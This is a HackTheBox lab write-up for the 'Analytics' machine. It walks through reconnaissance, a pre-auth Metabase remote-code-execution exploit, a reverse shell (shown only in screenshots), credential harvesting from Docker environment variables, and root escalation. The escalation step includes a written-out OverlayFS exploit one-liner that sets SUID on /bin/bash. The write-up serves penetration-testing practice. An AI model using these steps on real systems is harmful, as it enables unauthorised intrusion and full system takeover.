---
title: "Analytics"
date: 2024-12-24 20:45:23 +0800
categories: [HackTheBox]
tags: [HackTheBox]
---

![AnalyticsMachine](/assets/img/posts/AnalyticsIMG/machine.png){: width="800"}

<p><center>WriteUp Machine Analytics/HackTheBox</center></p>.

# Scan

![scan](/assets/img/posts/AnalyticsIMG/scan.png){: width="600"}

# Nmap Command Parameters Explained

| Parameter                 | Description                                                                  |
|---------------------------|------------------------------------------------------------------------------|
| `-p-`                     | Scans all ports (1-65535).                                                  |
| `--open`                  | Displays only open ports.                                                   |
| `-sS`                     | Performs a SYN scan (half-open), faster and stealthier.                     |
| `--min-rate 5000`         | Forces Nmap to send at least 5000 packets per second.                       |
| `-vvv`                    | Increases verbosity level, showing more details in the output.             |
| `-n`                      | Skips DNS resolution for faster scanning.                                  |
| `-Pn`                     | Disables host discovery; assumes the host is up.                           |
| `IP`                      | Target IP address to scan.                                                 |
| `-oG ports`               | Saves the output in Grepable format to a file named `ports`.               |

We add the ip to the **/etc/hosts** file so we can see it on our machine

![hosts](/assets/img/posts/AnalyticsIMG/hosts.png){: width="300"}

Now we will see if we find hidden directories through the **gobuster** tool, doing different tests, but it didn't come to anything, so we decided to try a DNS search.
I did a wfuzz on it and found data.

![wfuzz](/assets/img/posts/AnalyticsIMG/wfuzz.png){: width="1000"}


We see a subdirectory with the name data. We add it to etc/hosts -> data.analytical.htb

![data](/assets/img/posts/AnalyticsIMG/data.png){: width="500"}

We enter the url and see that an interface with the name metabase does not appear

![metabase](/assets/img/posts/AnalyticsIMG/metabase.png){: width="500"}

We proceeded to look for an exploit with metabase, with the wappalyzer I couldn't even see what the version was in the source code, but searching the internet I found an exploit that turned out to work

![exploit](/assets/img/posts/AnalyticsIMG/exploit.png){: width="600"}

a pre-auth exploit, the exploit details that we can get the setup token in this directory **/api/session/properties**

![token](/assets/img/posts/AnalyticsIMG/token.png){: width="600"}

We filter by token and in fact it gives us the token so it is a very serious error, now with the token the exploit details that we have remote command execution so I will try to connect to the victim machine through a reverse shell

![rev](/assets/img/posts/AnalyticsIMG/rev.png){: width="1000"}

We listen on port 443 and we are done but we still cannot access the user's flag

![rev](/assets/img/posts/AnalyticsIMG/nc.png){: width="700"}

We are the metabase user and in the same directory we find a file called **.dockerenv** so we are going to look at its environment variables to see if we find information that is interesting to us

![docker](/assets/img/posts/AnalyticsIMG/docker.png){: width="700"}
![env](/assets/img/posts/AnalyticsIMG/env.png){: width="700"}


We see that it gives us a **META_USER** and **META_PASS**. Since in the nmap scan **port 22 (ssh)** is open, we will see if with those credentials we can connect via **ssh**

![user](/assets/img/posts/AnalyticsIMG/user.png){: width="700"}

Ready we have access as the metalytics user and we see the user flag, now we must raise our privilege to be able to have the root flag.
After trying different methods, both for capabilities, suid permissions, whether cron tasks are executed, etc. When we see the version of the machine we search the internet to see if we find an exploit in that version and we find one.

![uname](/assets/img/posts/AnalyticsIMG/uname.png){: width="1000"}
![esc](/assets/img/posts/AnalyticsIMG/esc.png){: width="700"}

The exploit.sh file executed a line, what I did was first read it and interpret it and then modify it in the part where you passed the command to execute.
So what I did was give suid permissions to /bin/bash to be able to connect as root through SUID permissions

The command I executed was the following:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod u+s /bin/bash")'
```

![root](/assets/img/posts/AnalyticsIMG/root.png){: width="1000"}
